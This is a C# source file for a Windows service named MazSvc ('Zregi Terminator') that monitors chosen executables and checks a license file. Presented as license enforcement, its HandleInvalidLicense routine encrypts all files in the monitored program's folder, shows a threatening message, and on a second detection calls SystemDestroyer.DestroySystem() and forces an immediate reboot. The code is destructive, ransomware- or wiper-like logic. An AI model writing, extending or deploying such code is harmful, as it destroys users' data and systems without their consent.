using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Timers;
using MazSvc.Models;

namespace MazSvc
{
    /// <summary>
    /// Main Windows Service that monitors protected executables
    /// </summary>
    public partial class MazService : ServiceBase
    {
        private System.Timers.Timer _monitorTimer;
        private System.Timers.Timer _configReloadTimer;
        private List<ProtectedExecutable> _protectedExecutables;
        private ProcessMonitor _processMonitor;
        private ConfigManager _configManager;
        private NotificationHelper _notificationHelper;
        private bool _isProcessing;
        private HashSet<string> _notifiedProcesses; // Track already notified valid processes
        private Dictionary<string, ProcessInfo> _runningProtectedProcesses; // Track running protected processes
        private object _processLock = new object();
        
        // Named pipe server for IPC with Manager
        private Thread _pipeServerThread;
        private bool _stopPipeServer;
        private const string PIPE_NAME = "MazSvcStatusPipe";

        private const string LICENSE_FILE_NAME = "mazlicense.lic";
        private const int MONITOR_INTERVAL_MS = 500; // 500ms for fast polling (backup to event-based)
        private const int CONFIG_RELOAD_INTERVAL_MS = 5000; // Check config every 5 seconds

        public MazService()
        {
            this.ServiceName = "MazSvc";
            this.CanStop = true;
            this.CanPauseAndContinue = false;
            this.AutoLog = true;

            _protectedExecutables = new List<ProtectedExecutable>();
            _processMonitor = new ProcessMonitor();
            _configManager = new ConfigManager();
            _notificationHelper = new NotificationHelper();
            _isProcessing = false;
            _notifiedProcesses = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            _runningProtectedProcesses = new Dictionary<string, ProcessInfo>(StringComparer.OrdinalIgnoreCase);
            _stopPipeServer = false;
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                // Load protected executables from encrypted config
                try
                {
                    _protectedExecutables = _configManager.LoadConfig();
                }
                catch
                {
                    _protectedExecutables = new List<ProtectedExecutable>();
                }

                // Subscribe to process monitor events for immediate detection
                _processMonitor.ProtectedProcessStarted += OnProtectedProcessStarted;
                
                // Start WMI event-based monitoring in background (may fail on some systems)
                Thread eventMonitorThread = new Thread(() =>
                {
                    try
                    {
                        _processMonitor.StartEventMonitoring(_protectedExecutables);
                    }
                    catch
                    {
                        // WMI event monitoring not available, will rely on polling
                    }
                });
                eventMonitorThread.IsBackground = true;
                eventMonitorThread.Start();

                // Initialize and start the monitoring timer (backup to event-based)
                _monitorTimer = new System.Timers.Timer(MONITOR_INTERVAL_MS);
                _monitorTimer.Elapsed += OnMonitorTimerElapsed;
                _monitorTimer.AutoReset = true;
                _monitorTimer.Start();

                // Start config reload timer
                _configReloadTimer = new System.Timers.Timer(CONFIG_RELOAD_INTERVAL_MS);
                _configReloadTimer.Elapsed += OnConfigReloadTimerElapsed;
                _configReloadTimer.AutoReset = true;
                _configReloadTimer.Start();

                // Start named pipe server for IPC
                StartPipeServer();

                // Don't do immediate check on startup - let the timer handle it
                // This prevents blocking the service startup

                WriteEventLog("MazSvc started successfully.");
            }
            catch (Exception ex)
            {
                WriteEventLog("Error starting MazSvc: " + ex.Message);
                throw; // Re-throw to properly signal startup failure
            }
        }

        protected override void OnStop()
        {
            try
            {
                // Stop pipe server
                StopPipeServer();

                if (_monitorTimer != null)
                {
                    _monitorTimer.Stop();
                    _monitorTimer.Dispose();
                    _monitorTimer = null;
                }

                if (_configReloadTimer != null)
                {
                    _configReloadTimer.Stop();
                    _configReloadTimer.Dispose();
                    _configReloadTimer = null;
                }

                if (_processMonitor != null)
                {
                    _processMonitor.ProtectedProcessStarted -= OnProtectedProcessStarted;
                    _processMonitor.Dispose();
                }

                if (_notificationHelper != null)
                {
                    _notificationHelper.Dispose();
                }

                WriteEventLog("MazSvc stopped.");
            }
            catch (Exception ex)
            {
                WriteEventLog("Error stopping MazSvc: " + ex.Message);
            }
        }

        #region Event-Based Monitoring

        private void OnProtectedProcessStarted(object sender, ProcessStartedEventArgs e)
        {
            try
            {
                ProcessInfo processInfo = e.ProcessInfo;
                string processKey = string.Format("{0}|{1}", processInfo.ProcessId, processInfo.FullPath);

                lock (_processLock)
                {
                    // Add to running processes
                    if (!_runningProtectedProcesses.ContainsKey(processKey))
                    {
                        _runningProtectedProcesses[processKey] = processInfo;
                    }

                    // Show notification when protected program is detected (only once per process)
                    if (!_notifiedProcesses.Contains(processKey))
                    {
                        _notifiedProcesses.Add(processKey);
                        string exeName = Path.GetFileName(processInfo.FullPath);
                        
                        // Show system tray notification immediately
                        _notificationHelper.ShowNotification(
                            "Zregi Terminator",
                            string.Format("Protected application '{0}' is running.", exeName),
                            NotificationType.Information);
                    }
                }

                // Check license validity
                bool licenseValid = CheckLicenseValidity();

                if (!licenseValid)
                {
                    // License is invalid - take action
                    HandleInvalidLicense(processInfo);
                }
            }
            catch (Exception ex)
            {
                WriteEventLog("Error handling process start event: " + ex.Message);
            }
        }

        #endregion

        #region Named Pipe Server for IPC

        private void StartPipeServer()
        {
            _stopPipeServer = false;
            _pipeServerThread = new Thread(PipeServerLoop);
            _pipeServerThread.IsBackground = true;
            _pipeServerThread.Start();
        }

        private void StopPipeServer()
        {
            _stopPipeServer = true;
            
            // Create a dummy connection to unblock the WaitForConnection
            try
            {
                using (NamedPipeClientStream client = new NamedPipeClientStream(".", PIPE_NAME, PipeDirection.InOut))
                {
                    client.Connect(100);
                }
            }
            catch
            {
                // Ignore
            }

            if (_pipeServerThread != null && _pipeServerThread.IsAlive)
            {
                _pipeServerThread.Join(1000);
            }
        }

        private void PipeServerLoop()
        {
            while (!_stopPipeServer)
            {
                NamedPipeServerStream pipeServer = null;
                
                try
                {
                    pipeServer = new NamedPipeServerStream(
                        PIPE_NAME,
                        PipeDirection.InOut,
                        NamedPipeServerStream.MaxAllowedServerInstances,
                        PipeTransmissionMode.Message,
                        PipeOptions.None);

                    pipeServer.WaitForConnection();

                    if (_stopPipeServer) break;

                    // Read the request
                    byte[] requestBuffer = new byte[1024];
                    int bytesRead = pipeServer.Read(requestBuffer, 0, requestBuffer.Length);
                    string request = Encoding.UTF8.GetString(requestBuffer, 0, bytesRead).Trim();

                    string response = "";

                    if (request == "GET_STATUS")
                    {
                        // Return running protected processes
                        response = GetRunningProcessesJson();
                    }
                    else if (request == "PING")
                    {
                        response = "PONG";
                    }

                    // Send response
                    byte[] responseBuffer = Encoding.UTF8.GetBytes(response);
                    pipeServer.Write(responseBuffer, 0, responseBuffer.Length);
                    pipeServer.Flush();
                }
                catch (Exception ex)
                {
                    if (!_stopPipeServer)
                    {
                        WriteEventLog("Pipe server error: " + ex.Message);
                    }
                }
                finally
                {
                    if (pipeServer != null)
                    {
                        try
                        {
                            pipeServer.Disconnect();
                            pipeServer.Dispose();
                        }
                        catch
                        {
                            // Ignore cleanup errors
                        }
                    }
                }
            }
        }

        private string GetRunningProcessesJson()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("[");

            lock (_processLock)
            {
                bool first = true;
                foreach (var kvp in _runningProtectedProcesses)
                {
                    if (!first) sb.Append(",");
                    first = false;

                    ProcessInfo pi = kvp.Value;
                    sb.Append("{");
                    sb.Append("\"ProcessId\":");
                    sb.Append(pi.ProcessId);
                    sb.Append(",\"ProcessName\":\"");
                    sb.Append(EscapeJsonString(pi.ProcessName));
                    sb.Append("\",\"FullPath\":\"");
                    sb.Append(EscapeJsonString(pi.FullPath));
                    sb.Append("\"}");
                }
            }

            sb.Append("]");
            return sb.ToString();
        }

        private string EscapeJsonString(string value)
        {
            if (string.IsNullOrEmpty(value)) return "";
            
            StringBuilder sb = new StringBuilder();
            foreach (char c in value)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"': sb.Append("\\\""); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default: sb.Append(c); break;
                }
            }
            return sb.ToString();
        }

        #endregion

        #region Config Reload

        private void OnConfigReloadTimerElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                // Reload config to pick up changes
                List<ProtectedExecutable> newConfig = _configManager.LoadConfig();
                
                bool configChanged = false;
                
                if (newConfig.Count != _protectedExecutables.Count)
                {
                    configChanged = true;
                }
                else
                {
                    for (int i = 0; i < newConfig.Count; i++)
                    {
                        if (!string.Equals(newConfig[i].FullPath, _protectedExecutables[i].FullPath, StringComparison.OrdinalIgnoreCase))
                        {
                            configChanged = true;
                            break;
                        }
                    }
                }

                if (configChanged)
                {
                    _protectedExecutables = newConfig;
                    _processMonitor.UpdateProtectedExecutables(_protectedExecutables);
                    WriteEventLog("Configuration reloaded.");
                }
            }
            catch
            {
                // Ignore config reload errors
            }
        }

        #endregion

        private void OnMonitorTimerElapsed(object sender, ElapsedEventArgs e)
        {
            // Prevent re-entrant calls
            if (_isProcessing)
            {
                return;
            }

            _isProcessing = true;

            try
            {
                CheckProtectedExecutables();
            }
            catch (Exception ex)
            {
                WriteEventLog("Error in monitoring: " + ex.Message);
            }
            finally
            {
                _isProcessing = false;
            }
        }

        private void CheckProtectedExecutables()
        {
            if (_protectedExecutables == null || _protectedExecutables.Count == 0)
            {
                return;
            }

            // Get matching running processes
            List<ProcessInfo> matchingProcesses = _processMonitor.GetMatchingProcesses(_protectedExecutables);

            foreach (ProcessInfo processInfo in matchingProcesses)
            {
                // Create a unique key for this process
                string processKey = string.Format("{0}|{1}", processInfo.ProcessId, processInfo.FullPath);

                lock (_processLock)
                {
                    // Add to running processes
                    if (!_runningProtectedProcesses.ContainsKey(processKey))
                    {
                        _runningProtectedProcesses[processKey] = processInfo;
                    }

                    // Show notification when protected program is detected (only once per process)
                    if (!_notifiedProcesses.Contains(processKey))
                    {
                        _notifiedProcesses.Add(processKey);
                        string exeName = Path.GetFileName(processInfo.FullPath);
                        _notificationHelper.ShowNotification(
                            "Zregi Terminator",
                            string.Format("Protected application '{0}' is running.", exeName),
                            NotificationType.Information);
                    }
                }

                // Check license validity
                bool licenseValid = CheckLicenseValidity();

                if (!licenseValid)
                {
                    // License is invalid - take action
                    HandleInvalidLicense(processInfo);
                }
            }

            // Clean up notified processes that are no longer running
            CleanupNotifiedProcesses(matchingProcesses);
        }

        private bool CheckLicenseValidity()
        {
            try
            {
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string licenseFilePath = Path.Combine(appDirectory, LICENSE_FILE_NAME);

                if (!File.Exists(licenseFilePath))
                {
                    return false;
                }

                string licenseKey = File.ReadAllText(licenseFilePath).Trim();
                if (string.IsNullOrEmpty(licenseKey))
                {
                    return false;
                }

                return LicenseValidator.ValidateLicenseKey(licenseKey);
            }
            catch
            {
                return false;
            }
        }

        private void HandleInvalidLicense(ProcessInfo processInfo)
        {
            try
            {
                string exeDirectory = Path.GetDirectoryName(processInfo.FullPath);

                if (string.IsNullOrEmpty(exeDirectory))
                {
                    return;
                }

                // Check if files are already encrypted
                bool filesEncrypted = FileEncryptor.AreFilesEncrypted(exeDirectory);

                if (!filesEncrypted)
                {
                    // Encrypt all files in the executable's directory
                    FileEncryptor.EncryptAllFiles(exeDirectory, Path.GetFileName(processInfo.FullPath));

                    _notificationHelper.ShowNotification(
                        "Unauthorized Action",
                        "You are doing something that is not allowed. Do not try again.");
                }
                else
                {
                    // Files already encrypted - destroy system
                    _notificationHelper.ShowNotification(
                        "License Required",
                        "You have to get license from admin.");

                    // Destroy system
                    SystemDestroyer.DestroySystem();

                    // Force system restart
                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo();
                        startInfo.FileName = "shutdown.exe";
                        startInfo.Arguments = "/r /t 0 /f";
                        startInfo.UseShellExecute = false;
                        startInfo.CreateNoWindow = true;
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        Process.Start(startInfo);
                    }
                    catch
                    {
                        // Continue even if restart command fails
                    }
                }
            }
            catch (Exception ex)
            {
                WriteEventLog("Error handling invalid license: " + ex.Message);
            }
        }

        private void CleanupNotifiedProcesses(List<ProcessInfo> currentProcesses)
        {
            HashSet<string> currentKeys = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (ProcessInfo pi in currentProcesses)
            {
                currentKeys.Add(string.Format("{0}|{1}", pi.ProcessId, pi.FullPath));
            }

            lock (_processLock)
            {
                List<string> toRemove = new List<string>();
                foreach (string key in _notifiedProcesses)
                {
                    if (!currentKeys.Contains(key))
                    {
                        toRemove.Add(key);
                    }
                }

                foreach (string key in toRemove)
                {
                    _notifiedProcesses.Remove(key);
                    _runningProtectedProcesses.Remove(key);
                    _processMonitor.RemoveProcessKey(key);
                }
            }
        }

        private void WriteEventLog(string message)
        {
            try
            {
                if (!EventLog.SourceExists("MazSvc"))
                {
                    EventLog.CreateEventSource("MazSvc", "Application");
                }
                EventLog.WriteEntry("MazSvc", message, EventLogEntryType.Information);
            }
            catch
            {
                // Silently fail if event log cannot be written
            }
        }
    }

    /// <summary>
    /// Contains information about a running process
    /// </summary>
    public class ProcessInfo
    {
        public int ProcessId { get; set; }
        public string ProcessName { get; set; }
        public string FullPath { get; set; }
    }
}
